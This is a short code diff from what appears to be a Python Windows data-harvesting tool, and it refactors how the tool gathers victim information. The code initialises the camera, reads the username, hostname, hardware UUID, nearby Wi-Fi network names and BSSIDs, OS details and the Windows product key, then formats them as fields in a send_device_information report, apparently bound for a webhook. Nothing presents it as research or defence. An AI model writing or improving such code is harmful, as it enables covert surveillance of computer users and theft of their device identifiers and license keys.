@@ -52,15 +52,16 @@ def format_drive_info(drives):
 pygame.camera.init()
 username = str(os.getenv("USERNAME"))
 hostname = str(os.environ['COMPUTERNAME'])
-hwid = subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip()
-decoded_hwid = str(hwid.decode("utf-8"))
-wifi = pywifi.PyWiFi()
-iface = wifi.interfaces()[0]
-iface.scan()
-scan_results = iface.scan_results()
-for result in scan_results:
-    ssid = result.ssid
-    bssid = result.bssid
+hwid = str(subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip().decode("utf-8"))
+iface = pywifi.PyWiFi().interfaces()[0] if pywifi.PyWiFi().interfaces() is not None else None
+if iface is not None:
+    iface.scan()
+    for result in iface.scan_results():
+        ssid = result.ssid
+        bssid = result.bssid
+else:
+    ssid = "No result"
+    bssid = "No result"
 lang = subprocess.check_output('wmic os get MUILanguages /format:list').decode().strip().split('\r\r\n')[0].split('=')[1]
 system = str(subprocess.check_output('wmic os get Caption /format:list').decode().strip().split('\r\r\n')[0].split('=')[1])
 output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().strip()
@@ -116,7 +117,7 @@ def send_device_information():
             {
                 "name": "HWID",
                 "value":
-                    f"`{decoded_hwid}`",
+                    f"`{hwid}`",
                 "inline": False,
             },
             {
